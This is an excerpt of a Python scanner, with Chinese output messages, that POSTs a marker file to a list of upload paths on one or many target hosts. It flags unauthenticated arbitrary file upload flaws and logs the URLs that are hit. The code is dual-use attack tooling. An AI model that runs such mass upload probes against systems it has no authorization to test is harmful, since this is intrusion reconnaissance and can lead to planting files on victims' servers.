...
def vul_chek(url,dir):
    ...
    for up in upload:
        checkUrl = url+up
        checkUpload(checkUrl,dir)

    
    

def checkUpload(checkUrl,dir):
    files = {'file': open( dir, 'rb')}  
    try:
        headers["User-Agent"] = choice(USER_AGENTS)
        r = requests.post(checkUrl, files=files,timeout=10)
        text = r.text
        res = r.status_code
        if (res !=500 and res !=404):
            if 'cpyup' in text:
                click.secho('[+]'+checkUrl+'目标存在未授权任意文件上传，请手工验证', fg='red')
                with open('未授权任意文件上传'+'.txt', 'a', encoding='utf-8') as f:
                    f.writelines(checkUrl)
                    f.write('\n')
    except:
        print('[-]Something Wrong With '+checkUrl)
...
def main():
    if len(sys.argv) != 5:  # 判断输入长度是否合格
        print('Usage: python3 nologin-upload-cpy.py -h 10.10.10.10 -d upload.cpyup')
        print('Usage: python3 nologin-upload-cpy.py -r ip.txt -d upload.cpyup')
    ...
    if a == '-h':
        ...
        print('未授权任意文件上传.txt文件')
    else:
        main()
if __name__ == '__main__':
    file = open("upload_dir.txt","r")
    list = file.readlines()
    for fields in list: 
        if fields!="":
            upload.append(fields.strip())
    main()
